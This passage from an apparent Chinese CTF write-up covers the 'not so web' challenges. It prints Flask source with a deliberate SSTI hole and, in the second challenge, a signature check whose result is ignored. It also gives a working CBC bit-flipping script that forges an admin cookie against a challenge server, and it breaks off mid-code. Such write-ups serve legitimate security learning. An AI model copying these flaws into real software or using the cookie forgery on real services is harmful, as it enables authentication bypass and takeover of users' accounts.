json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_encrypted = base64.b64decode(cookie, validate=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(cookie_encrypted) &lt; <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        iv, padded = cookie_encrypted[:<span class="number">16</span>], cookie_encrypted[<span class="number">16</span>:]</span><br><span class="line">        cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">        decrypted = cipher.decrypt(padded)</span><br><span class="line">        cookie_json_bytes = unpad(decrypted, <span class="number">16</span>)</span><br><span class="line">        cookie_json = cookie_json_bytes.decode()</span><br><span class="line">    <span class="keyword">except</span> ValueError:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie_dict = json.loads(cookie_json)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span>, cookie_dict.get(<span class="string">&quot;name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    cookie_dict = asdict(user)</span><br><span class="line">    cookie_json = json.dumps(cookie_dict)</span><br><span class="line">    cookie_json_bytes = cookie_json.encode()</span><br><span class="line">    iv = os.urandom(<span class="number">16</span>)</span><br><span class="line">    padded = pad(cookie_json_bytes, <span class="number">16</span>)</span><br><span class="line">    cipher = AES.new(KEY, AES.MODE_CBC, iv)</span><br><span class="line">    encrypted = cipher.encrypt(padded)</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(iv + encrypted).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>))</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> valid <span class="keyword">or</span> <span class="keyword">not</span> current_username:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    user_profile = users.get(current_username)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> user_profile:</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;logout&quot;</span>))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> current_username == <span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        payload = request.args.get(<span class="string">&quot;payload&quot;</span>)</span><br><span class="line">        html_template = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;Welcome, %s !&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            Your payload: %s</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;img src=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;interesting.jpeg&#x27;) &#125;&#125;&quot; alt=&quot;Embedded Image&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span> % (</span><br><span class="line">            current_username,</span><br><span class="line">            payload,</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        html_template = (</span><br><span class="line">            <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE html&gt;</span></span><br><span class="line"><span class="string">&lt;html lang=&quot;en&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;head&gt;</span></span><br><span class="line"><span class="string">    &lt;meta charset=&quot;UTF-8&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;title&gt;Home&lt;/title&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css&quot;&gt;</span></span><br><span class="line"><span class="string">    &lt;link rel=&quot;stylesheet&quot; href=&quot;&#123;&#123; url_for(&#x27;static&#x27;, filename=&#x27;styles.css&#x27;) &#125;&#125;&quot;&gt;</span></span><br><span class="line"><span class="string">&lt;/head&gt;</span></span><br><span class="line"><span class="string">&lt;body&gt;</span></span><br><span class="line"><span class="string">    &lt;div class=&quot;container&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;h2 class=&quot;text-center&quot;&gt;server code (encoded)&lt;/h2&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot; style=&quot;word-break:break-all;&quot;&gt;</span></span><br><span class="line"><span class="string">        &#123;%% raw %%&#125;</span></span><br><span class="line"><span class="string">            %s</span></span><br><span class="line"><span class="string">        &#123;%% endraw %%&#125;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">        &lt;div class=&quot;text-center&quot;&gt;</span></span><br><span class="line"><span class="string">            &lt;a href=&quot;/logout&quot; class=&quot;btn btn-danger&quot;&gt;Logout&lt;/a&gt;</span></span><br><span class="line"><span class="string">        &lt;/div&gt;</span></span><br><span class="line"><span class="string">    &lt;/div&gt;</span></span><br><span class="line"><span class="string">&lt;/body&gt;</span></span><br><span class="line"><span class="string">&lt;/html&gt;</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">            % base64.b64encode(<span class="built_in">open</span>(__file__, <span class="string">&quot;rb&quot;</span>).read()).decode()</span><br><span class="line">        )</span><br><span class="line">    <span class="keyword">return</span> render_template_string(html_template)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/logout&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">logout</span>():</span><br><span class="line">    resp = redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    resp.delete_cookie(<span class="string">&quot;jwbcookie&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> resp</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>考点就是CBC字节翻转攻击，现在&#x2F;register路由下注册一个账号获取cookie</p><p>思路就是以admin用户登录，在&#x2F;home路由下进行ssti模板注入，那么如何变成admin用户呢？他已经存在这个用户了，我们可以用cookie伪造的方法来进行。cookie的加密是采用AES-CBC的方法的</p><p>我们先注册一个bdmin用户，到时候将<code>b</code>改成<code>a</code></p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250429105030297.png" alt="image-20250429105030297"></p><p>本地测试发现这个时候密文对应的明文是形如这样的，<code>b&#39;&#123;&quot;name&quot;: &quot;bdmin&quot;, &quot;password_raw&quot;: &quot;123&quot;, &quot;register_time&quot;: 1745636950&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#39;</code>，register_time会不一样。</p><p>这个时候更改IV，使得解密结果为<code>b&#39;&#123;&quot;name&quot;: &quot;admin&quot;, &quot;password_raw&quot;: &quot;123&quot;, &quot;register_time&quot;: 1745636950&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#39;</code>即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://61.147.171.105:50017&quot;</span></span><br><span class="line">data = &#123;<span class="string">&quot;username&quot;</span>: <span class="string">&quot;bdmin&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;123&quot;</span>&#125;</span><br><span class="line">session = requests.session()</span><br><span class="line">r = session.post(url + <span class="string">&quot;/login&quot;</span>, data=data)</span><br><span class="line">token = base64.b64decode(session.cookies.get_dict()[<span class="string">&#x27;jwbcookie&#x27;</span>].strip())</span><br><span class="line">iv = token[:<span class="number">16</span>]</span><br><span class="line">cipher = token[<span class="number">16</span>:]</span><br><span class="line">plaintext = <span class="string">b&#x27;&#123;&quot;name&quot;: &quot;bdmin&quot;, &quot;password_raw&quot;: &quot;123&quot;, &quot;register_time&quot;: 1745636950&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#x27;</span></span><br><span class="line"><span class="comment"># target = b&#x27;&#123;&quot;name&quot;: &quot;admin&quot;, &quot;password_raw&quot;: &quot;123&quot;, &quot;register_time&quot;: 1745636950&#125;\r\r\r\r\r\r\r\r\r\r\r\r\r&#x27;</span></span><br><span class="line">tmp = iv[<span class="number">10</span>] ^ <span class="built_in">ord</span>(<span class="string">&#x27;b&#x27;</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">newIV = iv[:<span class="number">10</span>] + long_to_bytes(tmp) + iv[<span class="number">11</span>:]</span><br><span class="line">newtoken = newIV + cipher</span><br><span class="line">header = &#123;<span class="string">&quot;Cookie&quot;</span>: <span class="string">b&quot;jwbcookie=&quot;</span> + base64.b64encode(newtoken)&#125;</span><br><span class="line">r = session.get(url + <span class="string">&quot;/home&quot;</span>, headers=header, allow_redirects=<span class="literal">False</span>)</span><br><span class="line"><span class="keyword">if</span> r.status_code != <span class="number">302</span>:</span><br><span class="line">    <span class="built_in">print</span>(r.status_code)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;cookie: <span class="subst">&#123;base64.b64encode(newtoken)&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><p>然后我们替换一下cookie就可以进行ssti了</p><p><img src="https://cdn.jsdelivr.net/gh/MeteorKai/blogImage@main/img/image-20250429105055426.png" alt="image-20250429105055426"></p><h2 id="not-so-web-2"><a href="#not-so-web-2" class="headerlink" title="not so web 2"></a>not so web 2</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64, json, time</span><br><span class="line"><span class="keyword">import</span> os, sys, binascii</span><br><span class="line"><span class="keyword">from</span> dataclasses <span class="keyword">import</span> dataclass, asdict</span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Dict</span>, <span class="type">Tuple</span></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> KEY, ADMIN_PASSWORD</span><br><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line"><span class="keyword">from</span> Crypto.Signature <span class="keyword">import</span> PKCS1_v1_5</span><br><span class="line"><span class="keyword">from</span> Crypto.Hash <span class="keyword">import</span> SHA256</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> (</span><br><span class="line">    Flask,</span><br><span class="line">    render_template,</span><br><span class="line">    render_template_string,</span><br><span class="line">    request,</span><br><span class="line">    redirect,</span><br><span class="line">    url_for,</span><br><span class="line">    flash,</span><br><span class="line">    session,</span><br><span class="line">    abort,</span><br><span class="line">)</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = KEY</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> os.path.exists(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>):</span><br><span class="line">    private_key = RSA.importKey(<span class="built_in">open</span>(<span class="string">&quot;/etc/ssl/nginx/local.key&quot;</span>, <span class="string">&quot;r&quot;</span>).read())</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    private_key = RSA.generate(<span class="number">2048</span>)</span><br><span class="line"></span><br><span class="line">public_key = private_key.publickey()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@dataclass</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">APPUser</span>:</span><br><span class="line">    name: <span class="built_in">str</span></span><br><span class="line">    password_raw: <span class="built_in">str</span></span><br><span class="line">    register_time: <span class="built_in">int</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#  In-memory store for user registration</span></span><br><span class="line">users: <span class="type">Dict</span>[<span class="built_in">str</span>, APPUser] = &#123;</span><br><span class="line">    <span class="string">&quot;admin&quot;</span>: APPUser(name=<span class="string">&quot;admin&quot;</span>, password_raw=ADMIN_PASSWORD, register_time=-<span class="number">1</span>)</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">validate_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bool</span>:</span><br><span class="line">    valid, _ = parse_cookie(cookie_b64)</span><br><span class="line">    <span class="keyword">return</span> valid</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">parse_cookie</span>(<span class="params">cookie_b64: <span class="built_in">str</span></span>) -&gt; <span class="type">Tuple</span>[<span class="built_in">bool</span>, <span class="built_in">str</span>]:</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> cookie_b64:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        cookie = base64.b64decode(cookie_b64, validate=<span class="literal">True</span>).decode()</span><br><span class="line">    <span class="keyword">except</span> binascii.Error:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        msg_str, sig_hex = cookie.split(<span class="string">&quot;&amp;&quot;</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span>, <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">    msg_dict = json.loads(msg_str)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = <span class="built_in">bytes</span>.fromhex(sig_hex)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        PKCS1_v1_5.new(public_key).verify(msg_hash, sig)</span><br><span class="line">        valid = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> (ValueError, TypeError):</span><br><span class="line">        valid = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> valid, msg_dict.get(<span class="string">&quot;user_name&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_cookie</span>(<span class="params">user: APPUser</span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    msg_dict = &#123;<span class="string">&quot;user_name&quot;</span>: user.name, <span class="string">&quot;login_time&quot;</span>: <span class="built_in">int</span>(time.time())&#125;</span><br><span class="line">    msg_str = json.dumps(msg_dict)</span><br><span class="line">    msg_str_bytes = msg_str.encode()</span><br><span class="line">    msg_hash = SHA256.new(msg_str_bytes)</span><br><span class="line">    sig = PKCS1_v1_5.new(private_key).sign(msg_hash)</span><br><span class="line">    sig_hex = sig.<span class="built_in">hex</span>()</span><br><span class="line">    packed = msg_str + <span class="string">&quot;&amp;&quot;</span> + sig_hex</span><br><span class="line">    <span class="keyword">return</span> base64.b64encode(packed.encode()).decode()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">if</span> validate_cookie(request.cookies.get(<span class="string">&quot;jwbcookie&quot;</span>)):</span><br><span class="line">        <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/register&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        user_name = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> user_name <span class="keyword">in</span> users:</span><br><span class="line">            flash(<span class="string">&quot;Username already exists!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            users[user_name] = APPUser(</span><br><span class="line">                name=user_name, password_raw=password, register_time=<span class="built_in">int</span>(time.time())</span><br><span class="line">            )</span><br><span class="line">            flash(<span class="string">&quot;Registration successful! Please login.&quot;</span>, <span class="string">&quot;success&quot;</span>)</span><br><span class="line">            <span class="keyword">return</span> redirect(url_for(<span class="string">&quot;login&quot;</span>))</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;register.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/login&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;POST&quot;</span>:</span><br><span class="line">        username = request.form[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">        password = request.form[<span class="string">&quot;password&quot;</span>]</span><br><span class="line">        <span class="keyword">if</span> username <span class="keyword">in</span> users <span class="keyword">and</span> users[username].password_raw == password:</span><br><span class="line">            resp = redirect(url_for(<span class="string">&quot;home&quot;</span>))</span><br><span class="line">            resp.set_cookie(<span class="string">&quot;jwbcookie&quot;</span>, generate_cookie(users[username]))</span><br><span class="line">            <span class="keyword">return</span> resp</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            flash(<span class="string">&quot;Invalid credentials. Please try again.&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;login.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/home&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">home</span>():</span><br><span class="line">    valid, current_username = parse_cookie(request.cookies.get(<span 